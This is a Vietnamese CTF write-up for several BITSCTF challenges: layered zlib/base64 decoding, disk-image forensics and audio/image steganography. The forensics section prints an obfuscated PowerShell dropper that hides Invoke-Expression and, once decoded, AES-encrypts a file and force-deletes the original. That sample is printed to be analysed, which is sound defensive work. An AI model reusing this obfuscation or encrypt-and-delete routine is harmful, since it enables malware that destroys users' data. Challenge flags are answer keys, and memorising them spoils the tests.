![image](https://github.com/user-attachments/assets/b42dfb89-16e1-433b-821b-152de5bc2945)

## _Solution_

Bài cho 1 file chall.py 

![image](https://github.com/user-attachments/assets/6cee4577-5fcd-4a66-92bd-8fc4a794583a)

Có thể thấy là một chương trình python sử dụng zlib và base64 đảo ngược để mã hóa nội dung của chuỗi 

Đơn giản chỉ cần viết script ngược lại với quá trình mã hóa để decode là xong

Vì bị mã hóa nhiều lớp nên script phải tự động lấy kết quả để decode tiếp cho đến khi ra được flag

```python
import base64
import zlib
import re

def decode_layer(data):
    try:
        decoded = base64.b64decode(data[::-1])  # Giải mã base64 với chuỗi bị đảo ngược
        decompressed = zlib.decompress(decoded)  # Giải nén zlib
        return decompressed.decode('utf-8')
    except Exception as e:
        return None

def extract_encoded_data(code):
    match = re.search(r"b'(.*?)'", code)
    return match.group(1) if match else None

def recursive_decode(encoded_data):
    while encoded_data:
        decoded_code = decode_layer(encoded_data)
        if not decoded_code:
            break
        print("[+] Decoded Layer:")
        print(decoded_code, "\n")
        encoded_data = extract_encoded_data(decoded_code)
    
    print("[+] Final Decoded Code:")
    print(decoded_code)

if __name__ == "__main__":
    obfuscated_code = "b'==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'"
    encoded_data = extract_encoded_data(obfuscated_code)
    if encoded_data:
        recursive_decode(encoded_data)
    else:
        print("Không tìm thấy dữ liệu bị mã hóa!")

```

![image](https://github.com/user-attachments/assets/b9ac5036-1258-4773-9d03-6fb3e6845bce)

```
FLAG: BITSCTF{obfuscation_and_then_some_more_obfuscation_4a4a4a4a} 
```

# _BABY DFIR_ _(DFIR)_

Đúng như tên bài là baby

Mở ra phát là thấy flag 🙈

![image](https://github.com/user-attachments/assets/627addf4-0166-427a-9cd9-7af2f6971ed8)

```
FLAG: BITSCTF{a_really_simple_intro_to_DFIR_12848a9e}
```

# _ViruS Camp 1_ _(DFIR)_

![Screenshot 2025-02-08 204327](https://github.com/user-attachments/assets/09a1938e-f316-4c23-8aaf-c5958a4494f2)

Bài cho 1 file dimp.ad1, dùng FTK imager phân tích

![image](https://github.com/user-attachments/assets/fc79f1e5-5469-43f3-b401-5ae9e77eba88)

Lướt qua 1 lượt thì thấy ở thư mục desktop có 1 file flag.enc nghi đã bị mã hóa theo mô tả

![image](https://github.com/user-attachments/assets/e964910c-f853-4bad-949a-6e65e3a2f023)

Giờ sẽ đi tìm tiếp file mã hóa

Tìm đến thư mục Temp trong App Data thấy có 1 file temp0001.ps1 khá khả nghi

![image](https://github.com/user-attachments/assets/d0354202-e6c5-4ba0-9c8d-9eceb584572c)

Nội dung file như sau

```
$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;

```

Đoạn mã trên là một đoạn mã PowerShell được làm rối (obfuscation)

> Chuỗi Base64 bị đảo ngược
> - $wy7qIGPnm36HpvjrL2TMUaRbz = "..." ;
> - $9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ;
> - [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ;
Một chuỗi Base64 đã bị đảo ngược từng ký tự.

> Giải mã Base64
> - $FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
> - Sau khi đảo ngược, chuỗi này được decode từ Base64 về dạng chuỗi UTF-8, có thể chứa mã lệnh thực thi.

> Thực thi chuỗi đã giải mã
> - $9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ;
> - new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ;
> - pwn $FHG7xpKlVqaDNgu1c2Utw ;
> - - "Invoke-Expression" bị tách thành nhiều phần để tránh bị phát hiện.
> - - Tạo một alias "PwN" trỏ đến Invoke-Expression (iex).
> - - Thực thi nội dung đã giải mã, có thể là mã độc hoặc lệnh từ máy chủ tấn công

Khá dài dòng, nhưng trc hết cứ reverse lại base64 rồi giải mã đã

```python
import base64

def decode_reversed_base64(encoded_reversed: str):
    # Đảo ngược chuỗi
    encoded = encoded_reversed[::-1]
    
    # Giải mã Base64
    try:
        decoded_bytes = base64.b64decode(encoded)
        decoded_str = decoded_bytes.decode('utf-8', errors='ignore')
        return decoded_str
    except Exception as e:
        return f"Error decoding: {e}"

# Thay thế bằng chuỗi Base64 đã đảo ngược của bạn
encoded_reversed = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ"  # Điền vào chuỗi cần giải mã
result = decode_reversed_base64(encoded_reversed)
print(result)
```

Kết quả: 

![image](https://github.com/user-attachments/assets/4f1a24a5-031e-473c-9aa3-00e6bc53aa0b)

```bash
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 
$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)
$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$encryptor = $aes.CreateEncryptor()
$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)
$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()
$cryptoStream.Close()
$outStream.Close()
Remove-Item $inputFile -Force
```

Có thể thấy đoạn script trên sử dụng thuật toán mã hóa AES-256-CBC để mã hóa tệp flag.png -> flag.enc

> Khóa & IV được tạo từ mật khẩu "MyS3cr3tP4ssw0rd" + salt bằng PBKDF2 (10,000 vòng lặp) với 
> - $keySize = 32
> - $ivSize = 16

> Chế độ AES: CBC với PKCS7 padding

> Sau khi mã hóa thực hiện lệnh "Remove-Item $inputFile -Force" để xóa file gốc là flag.png

Lại với hướng đi quen thuộc là viết script python để decode về tệp flag.png ban đầu

```python
import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def decrypt_file(input_file, output_file, password, salt, iterations=10000, key_size=32, iv_size=16):
    
    key = PBKDF2(password, salt, key_size, count=iterations)
    iv = PBKDF2(password, salt, iv_size, count=iterations)[:iv_size]

    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as infile:
        ciphertext = infile.read()
        plaintext = cipher.decrypt(ciphertext)

        padding_length = plaintext[-1] 
        plaintext = plaintext[:-padding_length]  

    with open(output_file, 'wb') as outfile:
        outfile.write(plaintext)

password = "MyS3cr3tP4ssw0rd"
salt = b'\x01\x02\x03\x04\x05\x06\x07\x08'
input_file = "flag.enc"
output_file = "flag_decrypted.png"
decrypt_file(input_file, output_file, password, salt)
print(f"File decrypted to: {output_file}")
```

Chi tiết: 
> PBKDF2(password, salt, key_size, count=iterations)
> - Dùng PBKDF2 để tạo khóa AES từ mật khẩu và salt, đảm bảo tính bảo mật.

> AES.new(key, AES.MODE_CBC, iv)
> - Tạo một đối tượng AES sử dụng chế độ CBC.

> Xử lý padding (PKCS7)
> - padding_length = plaintext[-1] → Lấy số byte padding từ cuối plaintext.
> - plaintext = plaintext[:-padding_length] → Xóa padding.

Tiến hành giải mã ra được 1 file ảnh

![image](https://github.com/user-attachments/assets/ab4f7be6-7da5-4d4a-b566-62008a701c77)

Ban đầu không mở được

![image](https://github.com/user-attachments/assets/270abe64-1f92-4c1e-b376-fdfdf81f8368)

Liền vào xem mã hex thử

![image](https://github.com/user-attachments/assets/ef5dbc2f-7cae-46d1-b7eb-89d5a61756b0)

Mọi chunk đều khá giống với 1 file png chuẩn nhưng chunk PNG và IHDR có vấn đề chút. Cụ thể

![image](https://github.com/user-attachments/assets/c75f01ee-00bf-462f-95f5-3bd16e3f3f15)

Sửa lại cho đúng và lưu lại là xem được

![image](https://github.com/user-attachments/assets/8021399a-f4ab-4394-8930-141c7fc10e0b)

Mở ra là có flag. Nhưng nhập vào lại incorrect :v

![image](https://github.com/user-attachments/assets/adbc575d-5c40-44a8-b0dc-5ed347d875a6)

Ngồi mò thêm các thư mục khác xem có gì không thì phát hiện tại _.vscode\extensions\underfined_publisher.activate-0.0.1\out_ có một file extension.js

![image](https://github.com/user-attachments/assets/6480ee19-4f19-4ad6-8441-50917f101cfa)

File trên là một extension cho Visual Studio Code (VSCode) được viết bằng JavaScript (TypeScript chuyển đổi sang JavaScript) và sử dụng Node.js APIs

> Mục đích chính là kích hoạt lệnh rs để chạy 1 đoạn powershell tạm thời (temp0001) trong thư mục C:\Users\vboxuser\AppData\Local\Temp\
> Chạy tập tin PowerShell này với quyền Bypass ExecutionPolicy

Hmm cũng không quan tâm lắm nhưng thấy có 1 dòng chữ khá giống base64 ở gần cuối 

![image](https://github.com/user-attachments/assets/244fd8e1-f4a0-4929-931d-25dc510625c3)

Đem decode thử thì có được flag chuẩn =))

![image](https://github.com/user-attachments/assets/d11532a4-1a95-4b60-b978-0a70c99117a5)

```
FLAG: BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}
```

# _ViruS Camp2_ _(DFIR)_

![image](https://github.com/user-attachments/assets/44644404-fe38-4bb8-8985-36c194253fdd)

Hmm lấy cái flag ở bên trên vừa nhập sai xuống đây là done

```
FLAG: BITSCTF{h0pe_y0u_enj0yed_th1s_145e3f1a}
```

# __Finders Keepers_STEGO (FORENSICS)_

Hmm năm nay for toàn stego :<

## _Solution_

Bài cho 1 file ảnh weird.png dung lượng khá lớn nghi là bị nhúng 

![image](https://github.com/user-attachments/assets/a6faeee6-670f-45ac-a751-a791ed3c6019)

binwalk thử thì thấy có 1 file jpg và 1 file wav

![image](https://github.com/user-attachments/assets/36e562e2-a78c-4607-bd12-83c9763b6836)

Extract 2 file đó ra 

Đây là file jpg

![image](https://github.com/user-attachments/assets/5931771e-d612-4bca-95ae-73aae63235c2)

Và 1 file âm thanh, mở ra nghe thấy có các tiếng bíp ngắn và dài nghi là mã MORSE

![image](https://github.com/user-attachments/assets/9514086e-ab5f-4966-b36d-38fd81cbf171)

Đem đi decode với bíp ngắn là dấu . còn bíp dài là dấu -

![image](https://github.com/user-attachments/assets/2adc0e4f-143a-40bd-9df1-f67d136b7306)

Đối với file .jpg thì dùng steghide với pass là vừa decode file âm thanh "SNOOOOOOPPPPPPP" (thực ra trong giải mình cũng méo nghĩ đến trường hợp này)

![image](https://github.com/user-attachments/assets/6e5d6bfd-d784-4835-be89-3fcdc1dfcc06)

Không đúng là do pass yêu cầu là full kí tự thường

![image](https://github.com/user-attachments/assets/7c05507b-68e7-49b8-9e0f-43830de107cb)

Ra một file flag.txt mở ra xem là có flag

![image](https://github.com/user-attachments/assets/177839c8-40b6-48ae-9faa-4d5acedca089)

```
FLAG: BITSCTF{1_4m_5l33py_1256AE76}
```
















